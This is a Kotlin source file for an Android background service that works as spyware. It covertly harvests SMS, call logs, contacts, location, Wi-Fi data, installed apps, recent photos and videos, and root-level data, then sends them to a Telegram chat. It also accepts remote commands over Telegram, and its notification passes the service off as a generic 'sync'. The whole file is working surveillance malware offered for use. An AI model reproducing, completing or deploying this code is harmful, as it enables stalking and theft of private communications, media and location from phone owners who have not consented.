package com.example.monitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import java.io.File
import java.util.concurrent.Executors

class SyncService : Service() {

    companion object {
        private const val TAG = "SyncService"
        private const val CANAL = "sync"
        private const val NOTIF_ID = 1001
        private const val ESTADO = "estado"
        const val ACAO_PARAR = "com.example.monitor.PARAR"

        @Volatile
        var ativo = false

        fun iniciar(ctx: Context) {
            val i = Intent(ctx, SyncService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
            else ctx.startService(i)
        }

        fun parar(ctx: Context) = ctx.stopService(Intent(ctx, SyncService::class.java))
    }

    private val executor = Executors.newSingleThreadExecutor()
    private val handler = Handler(Looper.getMainLooper())
    private val dir by lazy { File(cacheDir, "coleta").apply { mkdirs() } }
    private var appsEnviados = false

    private val prefs by lazy { getSharedPreferences(ESTADO, MODE_PRIVATE) }
    private var offset = 0L

    private val ciclo = object : Runnable {
        override fun run() {
            executor.execute { rotinaCompleta() }
            handler.postDelayed(this, Config.INTERVAL_MS)
        }
    }

    private val escuta = object : Runnable {
        override fun run() {
            executor.execute { lerComandos() }
            handler.postDelayed(this, Config.POLL_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        ativo = true
        offset = prefs.getLong("offset", 0L)
        criarCanal()
        iniciarForeground()

        executor.execute {
            val texto = if (!Config.configurado()) {
                "<b>Monitor iniciado</b>\nToken/chat não configurados."
            } else {
                "<b>Monitor iniciado</b>\n" +
                    "Modelo: ${Build.MANUFACTURER} ${Build.MODEL}\n" +
                    "Root: ${if (Root.disponivel()) "sim" else "não"}\n" +
                    "Use /ajuda."
            }
            Telegram.send(texto)
        }

        handler.postDelayed(ciclo, 3000)
        handler.postDelayed(escuta, 5000)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACAO_PARAR) {
            stopSelf()
            return START_NOT_STICKY
        }
        iniciarForeground()
        return START_STICKY
    }

    private fun tipoServico(): Int {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return 0
        var tipo = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        if (Collector.temPermissaoLocalizacao(this) && Collector.temLocalizacaoBackground(this)) {
            tipo = tipo or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        }
        if (Build.VERSION.SDK_INT >= 34) {
            tipo = tipo or ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
        }
        return tipo
    }

    private fun iniciarForeground() {
        val abrir = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val notificacao: Notification = NotificationCompat.Builder(this, CANAL)
            .setContentTitle("Sincronização ativa")
            .setContentText("Executando em segundo plano")
            .setSmallIcon(android.R.drawable.ic_menu_compass)
            .setOngoing(true)
            .setContentIntent(abrir)
            .build()

        val tipo = tipoServico()
        try {
            ServiceCompat.startForeground(this, NOTIF_ID, notificacao, tipo)
        } catch (e: Exception) {
            Log.e(TAG, "startForeground $tipo", e)
            try {
                ServiceCompat.startForeground(
                    this, NOTIF_ID, notificacao,
                    if (Build.VERSION.SDK_INT >= 34) ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE else 0
                )
            } catch (e2: Exception) {
                Log.e(TAG, "startForeground fallback", e2)
            }
        }
    }

    private fun criarCanal() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(
            NotificationChannel(CANAL, getString(R.string.canal_sync), NotificationManager.IMPORTANCE_LOW)
        )
    }

    private fun desde(chave: String): Long = prefs.getLong(chave, 0L)

    private fun marcar(chave: String, valor: Long) {
        if (valor <= 0L) return
        prefs.edit().putLong(chave, valor).apply()
    }

    private fun rotinaCompleta() {
        try {
            enviarSecao("Aparelho", Collector.aparelho(this))
            enviarSecao("Localização", Collector.localizacao(this))
            enviarSecao("Rede", Collector.rede(this))
            enviarSecao("Wi-Fi", Collector.wifi(this))

            enviarSecao("SMS", Collector.sms(this, desde("sms")))
            marcar("sms", System.currentTimeMillis())

            enviarSecao("Chamadas", Collector.chamadas(this, desde("chamadas")))
            marcar("chamadas", System.currentTimeMillis())

            enviarSecao("Contatos", Collector.contatos(this, desde("contatos")))
            marcar("contatos", System.currentTimeMillis())

            if (!appsEnviados) {
                enviarSecao("Aplicativos", Collector.aplicativos(this))
                appsEnviados = true
            }

            enviarMidia()
            enviarRoot()
        } catch (e: Exception) {
            Log.e(TAG, "rotina", e)
        }
    }

    private fun enviarSecao(titulo: String, conteudo: String) {
        val corpo = conteudo.substringAfter('\n', "").trim()
        if (corpo.isBlank()) return
        Telegram.send("<b>=== $titulo ===</b>\n$corpo")
    }

    private fun enviarMidia() {
        val lote = Collector.midiaRecente(this, desde("midia"))
        for (arquivo in lote.arquivos) {
            if (Telegram.sendFile(arquivo, "Mídia recente")) {
                marcar("midia", lote.ate)
            }
        }
        marcar("midia", lote.ate)
    }

    private fun enviarRoot() {
        if (!Root.disponivel()) return
        val pacote = Root.extrairTudo(File(dir, "root")) ?: return
        Telegram.sendFile(pacote, "Pacote root")
        pacote.delete()
    }

    private fun autorizado(chat: String, de: String): Boolean =
        if (Config.ADMIN_ID.isNotBlank()) de == Config.ADMIN_ID else chat == Config.CHAT_ID

    private fun lerComandos() {
        val atualizacoes = Telegram.getUpdates(offset)
        for (cmd in atualizacoes) {
            offset = cmd.id + 1
            prefs.edit().putLong("offset", offset).apply()
            if (!autorizado(cmd.chat, cmd.de)) continue
            try {
                tratar(cmd.chat, cmd.texto.trim())
            } catch (e: Exception) {
                Telegram.send("Erro: ${e.message}", cmd.chat)
            }
        }
    }

    private fun tratar(chat: String, comando: String) {
        when (comando.substringBefore(' ').lowercase()) {
            "/ajuda", "/start", "/help" -> Telegram.send(
                "<b>Comandos</b>\n" +
                    "/status — estado do aparelho\n" +
                    "/sms — mensagens\n" +
                    "/contatos — agenda\n" +
                    "/chamadas — histórico\n" +
                    "/apps — aplicativos\n" +
                    "/wifi — redes\n" +
                    "/loc — localização\n" +
                    "/contas — contas\n" +
                    "/midia — últimas fotos e vídeos\n" +
                    "/root — resumo e pacote de dados privilegiados\n" +
                    "/tudo — coleta completa\n" +
                    "/parar — encerra o serviço",
                chat
            )
            "/status" -> Telegram.send(Collector.aparelho(this), chat)
            "/sms" -> Telegram.send(Collector.sms(this, 0L), chat)
            "/contatos" -> Telegram.send(Collector.contatos(this, 0L), chat)
            "/chamadas" -> Telegram.send(Collector.chamadas(this, 0L), chat)
            "/apps" -> Telegram.send(Collector.aplicativos(this), chat)
            "/wifi" -> Telegram.send(Collector.wifi(this) + "\n" + Collector.rede(this), chat)
            "/loc" -> Telegram.send(Collector.localizacao(this), chat)
            "/contas" -> Telegram.send(Collector.contas(this), chat)
            "/midia" -> for (arquivo in Collector.midiaRecente(this, 0L).arquivos) {
                Telegram.sendFile(arquivo, "Mídia")
            }
            "/root" -> {
                Telegram.send(Root.resumo(), chat)
                val pacote = Root.extrairTudo(File(dir, "root"))
                if (pacote != null) {
                    Telegram.sendFile(pacote, "Pacote root")
                    pacote.delete()
                } else {
                    Telegram.send("Sem root disponível.", chat)
                }
            }
            "/tudo" -> {
                appsEnviados = false
                executor.execute { rotinaCompleta() }
                Telegram.send("Coleta completa disparada.", chat)
            }
            "/parar" -> {
                Telegram.send("Encerrando.", chat)
                stopSelf()
            }
            else -> Telegram.send("Comando desconhecido. Use /ajuda.", chat)
        }
    }

    override fun onDestroy() {
        ativo = false
        handler.removeCallbacksAndMessages(null)
        executor.execute { Telegram.send("<i>Monitor encerrado</i>") }
        executor.shutdown()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}